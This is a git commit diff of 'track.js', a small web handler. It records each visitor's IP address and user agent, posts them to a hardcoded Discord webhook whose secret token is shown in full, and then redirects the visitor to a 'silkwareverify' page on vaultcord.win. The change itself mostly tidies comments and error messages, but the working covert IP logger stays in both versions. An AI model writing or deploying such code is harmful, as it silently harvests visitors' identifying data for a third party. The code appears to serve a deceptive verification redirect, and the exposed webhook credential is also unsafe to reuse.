1a4c3c35c21c866c3179946d6dd154eeef1f03aa
x06y <anand209961@gmail.com>
2025-09-06 17:27:48 +0800

    Update track.js

--- track.js
+++ track.js
@@ -1,16 +1,11 @@
-// /api/track.js
-
 export default async function handler(req, res) {
   try {
-    // Grab visitor info
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || "Unknown";
     const userAgent = req.headers["user-agent"];
     const time = new Date().toISOString();
 
-    // Discord webhook message (hardcoded)
     const webhookUrl = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg";
 
-    // Send POST request
     await fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -19,12 +14,10 @@ export default async function handler(req, res) {
       })
     });
 
-    // Redirect visitor
     res.writeHead(302, { Location: "https://vaultcord.win/silkwareverify" });
     res.end();
-
-  } catch (error) {
-    console.error("Error sending webhook:", error);
-    res.status(500).send("Something went wrong");
+  } catch (err) {
+    console.error("Error:", err);
+    res.status(500).send("Internal Server Error");
   }
 }
